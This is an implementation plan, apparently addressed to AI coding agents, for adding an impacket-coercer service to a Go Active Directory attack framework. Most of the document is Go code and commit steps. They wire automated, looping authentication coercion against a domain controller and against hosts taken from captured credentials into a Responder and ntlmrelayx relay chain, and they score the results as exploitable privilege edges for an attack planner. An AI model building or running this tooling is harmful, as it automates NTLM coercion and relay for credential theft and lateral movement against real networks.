# Coercer Managed Service Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add `impacket-coercer` as a third `ManagedService` in the runtime substrate, completing the Responder → Relay → Coercer operational loop.

**Architecture:** Follows the proven `NewXxx` + `StartXxx` + supervisor wiring pattern exactly as `ntlmrelay.go` and `responder.go`. Coercer runs in a loop emitting `EvCoerceAttempt`/`EvCoerceSuccess` events. Events flow through the existing event bus → `materializeCoercerEdge` → planner replanning pipeline. No new consumer needed — the existing goroutine in `privesc.go` already dispatches via `materializeEdgeFromEvent`.

**Tech Stack:** Go, `impacket-coercer` (Python tool run as subprocess), existing `core.ServiceEvent` + `core.RuntimeProvider` types.

---

## File Map

| File | Action | Responsibility |
|---|---|---|
| `core/runtime.go` | Modify | Add `EvCoerceAttempt`, `EvCoerceSuccess` event types, `CoercerConfig` struct, `StartCoercer` to `RuntimeProvider` |
| `internal/runtime/coercer.go` | Create | Full coercer service: `DefaultCoercerConfig`, `buildCoercerArgs`, `startCoercer`, `parseCoercerLine`, `NewCoercerService`, `StartCoercerService` |
| `internal/runtime/supervisor.go` | Modify | Add `StartCoercer()` wrapper method |
| `modules/relay_helper.go` | Modify | Add `materializeCoercerEdge`, add `core.ServiceCoercion` to dispatch in `materializeEdgeFromEvent` |
| `modules/privesc.go` | Modify | Start Coercer after Relay in the service-start block (non-stealth only) |
| `internal/runtime/supervisor_test.go` | Modify | Add test coverage for StartCoercer lifecycle |
| `internal/runtime/coercer_test.go` | Create | Unit tests for parsing, arg building, edge materialization |

---

### Task 1: Core types — event types, config, interface

**Files:**
- Modify: `core/runtime.go:34-44` (add event types)
- Modify: `core/runtime.go:85-99` (add `StartCoercer` to interface)
- Modify: `core/runtime.go:101-140` (add `CoercerConfig` struct)

- [ ] **Step 1: Add two new event types**

After `EvCredentialAcquired` in the `ServiceEventType` const block, add:

```go
EvCoerceAttempt ServiceEventType = "coerce.attempt"
EvCoerceSuccess ServiceEventType = "coerce.success"
```

- [ ] **Step 2: Add `CoercerConfig` struct**

After `RelayConfig` at line 140, add:

```go
// CoercerConfig carries parameters for running impacket-coercer.
type CoercerConfig struct {
	ID           string        // service ID for the supervisor
	Label        string        // human-readable label
	SourceLabel  string        // instance identifier for edge attribution
	InterfaceIP  string        // listener IP coerced targets auth against
	Targets      []string      // IPs/hostnames to coerce
	Methods      []string      // smb, http, ldap (empty = all)
	Delay        time.Duration // sleep between rounds
}
```

- [ ] **Step 3: Add `StartCoercer` to `RuntimeProvider` interface**

After `StartResponder` at line 96, add:

```go
// StartCoercer starts an impacket-coercer instance as a managed service.
StartCoercer(ctx context.Context, cfg CoercerConfig) error
```

- [ ] **Step 4: Commit**

```bash
git add core/runtime.go
git commit -m "feat: add CoercerConfig, EvCoerceAttempt/Success, StartCoercer interface"
```

---

### Task 2: Coercer service implementation

**Files:**
- Create: `internal/runtime/coercer.go`

- [ ] **Step 1: Write the package header and imports**

```go
package runtime

import (
	"bufio"
	"context"
	"fmt"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"adpack/core"
)
```

- [ ] **Step 2: Define coercion line regex**

Best-effort extractor — never strict validator. Tolerates hostname variants, missing timestamps, multi-method batching.

```go
// coercerLineRe extracts (host, method) from impacket-coercer output lines.
// Patterns:
//
//	"[*] SMB coercion triggered against TARGET at TIMESTAMP"
//	"[*] HTTP coercion triggered against HOST.DOMAIN.LOCAL"
//	"[*] Failed to coerce TARGET via SMB"
//	"[+] Successfully coerced HOST$! Method: SMB"
var coercerLineRe = regexp.MustCompile(`(?i)(?:coerci.n\s+(?:triggered|against|success)|Successfully\s+coerced)\s+(\S+?)(?:\s+at\s+\S+)?(?:\s*!)?`)
```

- [ ] **Step 3: Write DefaultCoercerConfig**

```go
func DefaultCoercerConfig(interfaceIP string, targets []string) CoercerConfig {
	return CoercerConfig{
		InterfaceIP: interfaceIP,
		Targets:     targets,
		Methods:     []string{},
		Delay:       60 * time.Second,
	}
}
```

- [ ] **Step 4: Write buildCoercerArgs**

```go
func buildCoercerArgs(cfg CoercerConfig) []string {
	var args []string
	args = append(args, "-l", cfg.InterfaceIP)
	for _, t := range cfg.Targets {
		args = append(args, "-t", t)
	}
	for _, m := range cfg.Methods {
		args = append(args, "-m", m)
	}
	args = append(args, "--timeout", "10")
	return args
}
```

- [ ] **Step 5: Write startCoercer**

Follows the `startResponder` pattern: spawns `impacket-coercer`, returns `(cmd, lines chan, stop func, error)`. Runs in a loop with `cfg.Delay` between rounds, respects context cancellation.

```go
func startCoercer(ctx context.Context, cfg CoercerConfig) (*exec.Cmd, <-chan string, func() error, error) {
	lines := make(chan string, 64)

	stop := func() error {
		return nil
	}

	go func() {
		defer close(lines)

		for {
			select {
			case <-ctx.Done():
				return
			default:
			}

			args := buildCoercerArgs(cfg)
			cmd := exec.CommandContext(ctx, "impacket-coercer", args...)

			stdout, err := cmd.StdoutPipe()
			if err != nil {
				return
			}

			if err := cmd.Start(); err != nil {
				return
			}

			scanner := bufio.NewScanner(stdout)
			for scanner.Scan() {
				select {
				case lines <- scanner.Text():
				case <-ctx.Done():
					return
				}
			}

			cmd.Wait()

			select {
			case <-ctx.Done():
				return
			case <-time.After(cfg.Delay):
			}
		}
	}()

	return nil, lines, stop, nil
}
```

Note: `startCoercer` doesn't return a real `*exec.Cmd` because the process is ephemeral (new one per round). The stop function relies on context cancellation.

- [ ] **Step 6: Write parseCoercerLine**

Best-effort extraction. Returns `(host, method, ok)`. On parse failure, returns `("", "", false)` — caller skips the line.

```go
func parseCoercerLine(line string) (host, method string, ok bool) {
	lower := strings.ToLower(line)

	// Check for failure indicators
	if strings.Contains(lower, "failed") {
		return "", "", false
	}

	// Extract host
	m := coercerLineRe.FindStringSubmatch(line)
	if len(m) < 2 {
		return "", "", false
	}
	host = strings.TrimSpace(m[1])

	// Extract method if present
	if idx := strings.Index(lower, "method:"); idx >= 0 {
		method = strings.TrimSpace(line[idx+7:])
		if idx2 := strings.IndexAny(method, " \t"); idx2 >= 0 {
			method = method[:idx2]
		}
		method = strings.ToUpper(method)
	} else {
		// Try to infer from context
		for _, m := range []string{"smb", "http", "ldap", "rpc"} {
			if strings.Contains(lower, m) {
				method = strings.ToUpper(m)
				break
			}
		}
	}

	return host, method, true
}
```

- [ ] **Step 7: Write NewCoercerService**

```go
func NewCoercerService(id, label string, cfg CoercerConfig) *core.ManagedService {
	return &core.ManagedService{
		ID:    id,
		Type:  core.ServiceCoercion,
		Label: label,
		State: core.ServiceStopped,
		Config: map[string]any{
			"interface_ip": cfg.InterfaceIP,
			"targets":      cfg.Targets,
			"methods":      cfg.Methods,
			"delay":        cfg.Delay.String(),
			"source_label": cfg.SourceLabel,
			"_auth_count":  0,
		},
		ValidUntil: time.Now().Add(4 * time.Hour),
		Events:     make(chan core.ServiceEvent, 64),
	}
}
```

- [ ] **Step 8: Write StartCoercerService**

Follows `StartResponderService` pattern. Manages the loop, emits `EvCoerceAttempt` per target and `EvCoerceSuccess` on confirmed auths. Updates `_auth_count` in config for health summary.

```go
func StartCoercerService(svc *core.ManagedService, cfg CoercerConfig, parentCtx context.Context) error {
	ctx, cancel := context.WithCancel(parentCtx)

	_, lines, stop, err := startCoercer(ctx, cfg)
	if err != nil {
		cancel()
		return err
	}

	svc.Config["_cmd"] = nil
	svc.Config["_cancel"] = cancel
	svc.StopFn = func() error {
		cancel()
		return stop()
	}
	svc.State = core.ServiceRunning
	svc.LastHeartbeat = time.Now()

	roundTargets := make(map[string]bool)
	for _, t := range cfg.Targets {
		roundTargets[t] = true
	}

	go func() {
		for line := range lines {
			// Emit attempt for targets at start of round
			if len(roundTargets) > 0 {
				for t := range roundTargets {
					svc.Events <- core.ServiceEvent{
						Type:      core.EvCoerceAttempt,
						ServiceID: svc.ID,
						Service:   core.ServiceCoercion,
						Timestamp: time.Now(),
						Data: map[string]any{
							"target":       t,
							"interface_ip": cfg.InterfaceIP,
							"source_label": cfg.SourceLabel,
						},
					}
				}
				roundTargets = make(map[string]bool)
			}

			if host, method, ok := parseCoercerLine(line); ok {
				count, _ := svc.Config["_auth_count"].(int)
				svc.Config["_auth_count"] = count + 1

				svc.Events <- core.ServiceEvent{
					Type:      core.EvCoerceSuccess,
					ServiceID: svc.ID,
					Service:   core.ServiceCoercion,
					Timestamp: time.Now(),
					Data: map[string]any{
						"raw":          line,
						"target":       host,
						"method":       method,
						"interface_ip": cfg.InterfaceIP,
						"source_label": cfg.SourceLabel,
					},
				}
				svc.LastHeartbeat = time.Now()
			}
		}
		svc.State = core.ServiceStopped
	}()

	return nil
}
```

- [ ] **Step 9: Commit**

```bash
git add internal/runtime/coercer.go
git commit -m "feat: add coercer service (NewCoercerService, StartCoercerService)"
```

---

### Task 3: Supervisor wiring

**Files:**
- Modify: `internal/runtime/supervisor.go`

- [ ] **Step 1: Add `StartCoercer` method to supervisor**

Same pattern as `StartRelay`/`StartResponder`. Insert after `StartResponder` at line 222.

```go
func (s *ServiceSupervisor) StartCoercer(ctx context.Context, cfg core.CoercerConfig) error {
	id := cfg.ID
	if id == "" {
		id = "coercer-main"
	}
	label := cfg.Label
	if label == "" {
		label = "Coercer Trigger"
	}

	svc := NewCoercerService(id, label, cfg)
	if err := s.StartService(*svc); err != nil {
		return err
	}

	svc = s.Service(id)
	return StartCoercerService(svc, cfg, ctx)
}
```

- [ ] **Step 2: Commit**

```bash
git add internal/runtime/supervisor.go
git commit -m "feat: add StartCoercer to supervisor"
```

---

### Task 4: Edge materialization

**Files:**
- Modify: `modules/relay_helper.go`

- [ ] **Step 1: Add `materializeCoercerEdge`**

After `materializeResponderEdge` (line 156), add:

```go
func materializeCoercerEdge(evt core.ServiceEvent) *core.PrivilegeEdge {
	if evt.Type != core.EvCoerceSuccess && evt.Type != core.EvCoerceAttempt {
		return nil
	}

	raw, _ := evt.Data["raw"].(string)
	target, _ := evt.Data["target"].(string)
	method, _ := evt.Data["method"].(string)
	interfaceIP, _ := evt.Data["interface_ip"].(string)
	sourceLabel, _ := evt.Data["source_label"].(string)

	if target == "" {
		return nil
	}

	// Normalise hostname: strip FQDN suffix, keep only NetBIOS part
	hostName := target
	if idx := strings.Index(target, "."); idx >= 0 {
		hostName = target[:idx]
	}
	hostName = strings.ToUpper(hostName) + "$"

	edgeType := "coercer_attempt"
	confidence := 0.4
	exploitability := 0.5
	weight := 6.0

	if evt.Type == core.EvCoerceSuccess {
		edgeType = "coercer_auth"
		confidence = 0.8
		exploitability = 0.7
		weight = 4.0
	}

	sourcePrincipal := hostName
	targetPrincipal := interfaceIP
	if sourceLabel != "" {
		targetPrincipal = sourceLabel
	}

	return &core.PrivilegeEdge{
		SourcePrincipal: sourcePrincipal,
		TargetPrincipal: targetPrincipal,
		AccessRight:     "COERCER_" + strings.ToUpper(method),
		EdgeType:        edgeType,
		Domain:          "DOMAIN",
		Source:          "coercer",
		Confidence:      confidence,
		Weight:          weight,
		Exploitability:  exploitability,
		Noise:           0.5,
		Requires:        []string{"impacket-coercer", "responder", "impacket-ntlmrelayx"},
	}
}
```

- [ ] **Step 2: Add dispatch case**

In `materializeEdgeFromEvent`, after the `case core.ServiceResponder:` line, add:

```go
case core.ServiceCoercion:
    return materializeCoercerEdge(evt)
```

- [ ] **Step 3: Update runtimeHealthSummary to include auth_count**

In `runtimeHealthSummary`, after the hash count check for `_hash_count`, also check `_auth_count`:

```go
authCount := 0
if cfg, ok := svc.Config["_auth_count"].(int); ok {
    authCount = cfg
}
if authCount > 0 {
    h += fmt.Sprintf("(%d auths)", authCount)
}
```

- [ ] **Step 4: Commit**

```bash
git add modules/relay_helper.go
git commit -m "feat: add materializeCoercerEdge and dispatch"
```

---

### Task 5: Wire Coercer into privesc.go

**Files:**
- Modify: `modules/privesc.go:38-92`

- [ ] **Step 1: Start Coercer after Relay**

After the relay block (line 71), add:

```go
// Start coercer to trigger authentications
coercerTargets := []string{host.IP} // Start with the DC itself
// Expand to other reachable hosts if available
for _, cred := range state.Creds {
    if cred.Target != "" && cred.Target != host.IP {
        coercerTargets = append(coercerTargets, cred.Target)
    }
}
coercerCfg := core.CoercerConfig{
    ID:          "coercer-main",
    Label:       "Coercer Trigger",
    SourceLabel: host.IP,
    InterfaceIP: "0.0.0.0",
    Targets:     coercerTargets,
    Methods:     []string{},
    Delay:       120 * time.Second,
}
if err := runtime.StartCoercer(ctx, coercerCfg); err != nil {
    fmt.Printf("[!] Failed to start coercer: %v\n", err)
} else {
    fmt.Printf("[+] Coercer started, targeting %d host(s)\n", len(coercerTargets))
}
```

- [ ] **Step 2: Commit**

```bash
git add modules/privesc.go
git commit -m "feat: wire coercer service into privesc flow"
```

---

### Task 6: Tests

**Files:**
- Create: `internal/runtime/coercer_test.go`

- [ ] **Step 1: Write coercer parsing tests**

```go
package runtime

import (
	"testing"
)

func TestParseCoercerLine_Success(t *testing.T) {
	line := "[*] SMB coercion triggered against KINGSLANDING at 2025-05-22 12:00:00"
	host, method, ok := parseCoercerLine(line)
	if !ok {
		t.Fatal("expected ok")
	}
	if host != "KINGSLANDING" {
		t.Errorf("expected KINGSLANDING, got %s", host)
	}
	if method != "SMB" {
		t.Errorf("expected SMB, got %s", method)
	}
}
```

Add test cases for:
- `TestParseCoercerLine_FQDN` — `"coercion triggered against KINGSLANDING.SEVENKINGDOMS.LOCAL"`
- `TestParseCoercerLine_WithDollar` — `"Successfully coerced KINGSLANDING$!"`
- `TestParseCoercerLine_Failed` — `"Failed to coerce TARGET via SMB"`
- `TestParseCoercerLine_MissingTimestamp` — no `at TIMESTAMP` suffix
- `TestParseCoercerLine_EmptyLine` — empty input
- `TestBuildCoercerArgs_Basic` — verify args contain `-l`, `-t`, `--timeout`
- `TestBuildCoercerArgs_WithMethods` — verify method args added

- [ ] **Step 2: Write MaterializeCoercerEdge tests in `modules/relay_helper_test.go`**

Test `materializeCoercerEdge` for:
- Success event → correct SourcePrincipal (HOST$), confidence 0.8
- Attempt event → confidence 0.4
- Unknown event type → nil
- Missing target → nil
- FQDN host → normalised to NetBIOS$

- [ ] **Step 3: Write supervisor test in `internal/runtime/supervisor_test.go`**

Add `TestStartCoercer` — starts a coercer service, verifies state, stops it. Uses minimal config with empty targets list (no real coercion needed).

- [ ] **Step 4: Run tests**

```bash
go test ./internal/runtime/... -v -run "TestParse|TestStartCoercer" -count=1
go test ./modules/... -v -run "TestMaterializeCoercerEdge" -count=1
```

Expected: all pass

- [ ] **Step 5: Full test suite**

```bash
go test ./... -count=1
```

Expected: all pass

- [ ] **Step 6: Commit**

```bash
git add internal/runtime/coercer_test.go modules/relay_helper_test.go
git commit -m "test: coercer parsing, materialize edge, and supervisor lifecycle"
```

---

### Task 7: Build verification

- [ ] **Step 1: go vet**

```bash
go vet ./...
```

Expected: clean

- [ ] **Step 2: go build**

```bash
go build ./...
```

Expected: clean

- [ ] **Step 3: Final commit**

```bash
git add -A
git commit -m "chore: finalize coercer managed service implementation"
```
